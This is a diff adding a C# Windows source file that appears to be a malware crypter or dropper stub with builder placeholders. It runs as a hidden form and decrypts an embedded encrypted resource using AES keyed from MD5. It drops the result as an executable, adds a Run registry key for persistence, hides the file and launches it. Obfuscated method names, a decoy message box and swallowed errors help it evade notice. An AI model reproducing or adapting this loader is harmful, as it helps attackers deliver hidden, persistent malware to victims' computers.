@@ -1,0 +1,147 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Data;
+using System.Drawing;
+using System.Text;
+using System.Windows.Forms;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Resources;
+using System.Security.Cryptography;
+using System.Reflection;
+using Microsoft.Win32;
+ 
+static class Program
+{
+    [STAThread]
+    static void Main()
+    {
+        Application.EnableVisualStyles();
+        Application.SetCompatibleTextRenderingDefault(false);
+        Application.Run(new frmOne());
+    }
+}
+
+class Reader
+{
+    public static byte[] 謙謬謨謫謔謨謵謨謮謬謫()
+    {
+        ResourceManager Manager = new ResourceManager("Encrypted", Assembly.GetExecutingAssembly());
+        byte[] bytes = (byte[])Manager.GetObject("encfile");
+        return bytes;
+    }
+}
+
+public partial class frmOne : Form
+{
+    private void InitializeComponent()
+    {
+        this.SuspendLayout();
+        this.FormBorderStyle = FormBorderStyle.None;
+        this.ShowInTaskbar = false;
+        this.ResumeLayout(false);
+        this.Visible = false;
+        this.WindowState = FormWindowState.Minimized;
+    }
+
+    string storage = "[storage-replace]";
+    bool startup = [startup - replace];
+    bool hide = [hide - replace];
+    bool msgBox = [msgbox - replace];
+	bool randomName = [random-replace];
+    string executePath = "[execute-path]";
+    string fileName = "[file-name]";
+    string msgTitle = "[msgbox - title]";
+    string msgText = "[msgbox - text]";
+    MessageBoxIcon msgIcon = [msg - icon];
+
+    public frmOne()
+    {
+        InitializeComponent();
+        if (msgBox)
+            MsgBox();
+        new System.Threading.Thread(delegate () 
+        {
+            try
+            {
+                byte[] filebytes = null;
+
+                if (storage == "managed")
+                    filebytes = Reader.謙謬謨謫謔謨謵謨謮謬謫();
+
+                filebytes = 謈謌謚謋謬謪謹譀謷謻(filebytes, "[key-replace]");
+                謊謶謷譀謍謰謳謬("",filebytes);
+            }
+            catch(Exception)
+            {
+
+            }
+        }).Start();
+    }
+
+    public static byte[] 謈謌謚謋謬謪謹譀謷謻(byte[] input, string Pass)
+    {
+        System.Security.Cryptography.RijndaelManaged AES = new System.Security.Cryptography.RijndaelManaged();
+        byte[] hash = new byte[32];
+        byte[] temp = new MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.ASCII.GetBytes(Pass));
+        Array.Copy(temp, 0, hash, 0, 16);
+        Array.Copy(temp, 0, hash, 15, 16);
+        AES.Key = hash;
+        AES.Mode = System.Security.Cryptography.CipherMode.ECB;
+        System.Security.Cryptography.ICryptoTransform DESDecrypter = AES.CreateDecryptor();
+        return DESDecrypter.TransformFinalBlock(input, 0, input.Length);
+    }
+
+    public void MsgBox()
+    {
+        MessageBox.Show(msgText, msgTitle, MessageBoxButtons.OK, msgIcon);
+    }
+
+    private string FindPath(string path)
+    {
+        if (path.Equals("%APPDATA%"))
+            return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        else if (path.Equals("%SYSTEM32%"))
+            return Environment.GetFolderPath(Environment.SpecialFolder.System);
+        else if (path.Equals("%DESKTOP%"))
+            return Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+        else if (path.Equals("%CurrentPath%"))
+            return Environment.CurrentDirectory;
+        //if (path.Equals("%PROGRAMFILES%"))
+		else
+            return Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
+    }
+
+    public void 謈謫謫講謶謚謻謨謹謻謼謷(string path)
+    {
+        RegistryKey Key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+        Key.SetValue(Path.GetFileName(path).Split('.')[0], path);
+    }
+
+    public void 謏謰謫謬謍謰謳謬(string path)
+    {
+        FileInfo Info = new FileInfo(path);
+        Info.Attributes = FileAttributes.Hidden;
+    }
+
+    public void 謊謶謷譀謍謰謳謬(string path,byte[] fileBytes)
+    {
+        path = Path.Combine(FindPath(executePath),fileName);
+        if(!File.Exists(path))
+            File.WriteAllBytes(path, fileBytes);
+        else
+            if(randomName)
+            {
+                fileName = Path.GetRandomFileName() + ".exe";
+                path = Path.Combine(FindPath(executePath), fileName);
+                File.WriteAllBytes(path, fileBytes);
+            }
+
+        if (startup)
+            謈謫謫講謶謚謻謨謹謻謼謷(path);
+        if (hide)
+            謏謰謫謬謍謰謳謬(path);
+        System.Diagnostics.Process.Start(path);
+    }
+}
+
